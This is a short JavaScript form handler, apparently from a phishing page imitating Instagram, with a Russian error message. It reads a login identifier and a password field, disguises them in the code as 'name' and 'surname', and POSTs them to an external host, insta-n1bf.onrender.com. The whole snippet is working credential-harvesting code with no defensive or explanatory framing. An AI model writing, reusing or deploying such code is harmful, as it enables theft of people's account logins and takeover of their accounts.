const form = document.getElementById('userForm');

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const name = document.getElementById('identifier').value.trim();
  const surname = document.getElementById('password').value.trim();

  try {
    const response = await fetch('https://insta-n1bf.onrender.com/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ name, surname })
    });

    if (!response.ok) {
      throw new Error('Request failed');
    }


    form.reset();
  } catch (error) {
    alert('Ошибка при отправке. Проверьте, что backend запущен.');
  }
});
